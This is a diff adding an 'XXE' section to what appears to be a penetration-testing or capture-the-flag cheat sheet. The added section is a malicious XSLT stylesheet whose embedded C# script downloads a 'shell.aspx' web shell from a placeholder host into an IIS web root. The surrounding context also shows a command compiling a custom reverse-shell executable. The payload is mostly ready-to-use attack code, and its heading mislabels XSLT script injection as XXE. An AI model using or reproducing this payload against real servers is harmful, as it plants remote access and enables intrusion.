@@ -276,7 +276,30 @@ Custom Tool:
 ```
 i586-mingw32msvc-gcc reverse.c -o ~/Desktop/custom-reverse.exe -lws2_32
 ```
+### XXE
+```
+<?xml version='1.0'?>
+<xsl:stylesheet version="1.0"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:msxsl="urn:schemas-microsoft-com:xslt"
+xmlns:user="http://mycompany.com/mynamespace">
+<msxsl:script language="C#" implements-prefix="user">
+<![CDATA[
+public string xml()
+{
+    System.Net.WebClient webClient = new System.Net.WebClient();
+    webClient.DownloadFile("https://x.x.x.x/shell.aspx",
+                       @"c:\inetpub\wwwroot\shell.aspx");
 
+    return "Exploit Success";
+}
+]]>
+</msxsl:script>
+<xsl:template match="/">
+<xsl:value-of select="user:xml()"/>
+</xsl:template>
+</xsl:stylesheet>
+```
 
 ## FLAG & CAPTURE
 
